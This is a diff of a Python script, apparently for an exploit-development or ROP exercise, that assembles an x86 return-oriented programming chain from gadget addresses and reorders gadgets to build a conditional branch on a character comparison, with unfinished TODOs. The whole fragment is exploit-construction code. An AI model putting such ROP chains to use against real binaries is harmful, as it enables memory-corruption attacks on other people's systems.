@@ -28,7 +28,7 @@ double_ecx = 0x08049d37  # add ecx, ecx; ret;
 
 the_esp_op = 0x0809c3c1  # add esp, dword ptr [ebx + eax*4]; ret;
 
-stdout.write("Foo Bar Baz\x00\n")  # To be read into `plaintext`
+stdout.write("Doo Bar Baz\x00\n")  # To be read into `plaintext`
 
 # Note payload cannot contain ord("\n")
 
@@ -47,20 +47,22 @@ code = [
     0x0,
     mov_ecx_eax,
 
+    # We want the condition break if char <= '\n'
+    # i.e. CF is set if we do sub char - '\n'
+    # Load the '\n'
+    pop_eax,
+    ord('D') + 1,  # TODO: should be \n + 1
+    xchg_eax_edx,
     # Load Element
     pop_eax,
     0x0,
     pop_ebx,
     plaintext,
     xlatb,
-
-    xchg_eax_edx,
-    pop_eax,
-    ord('D') + 1,  # TODO: should be \n + 1
     sub_eax_edx,
     load_cl_CF,
 
-    # Tune the next set to the number of instructions left in the `code` list
+    # TODO: Tune the next set to the number of instructions left in the `code` list
     double_ecx,
     double_ecx,
     inc_ecx,
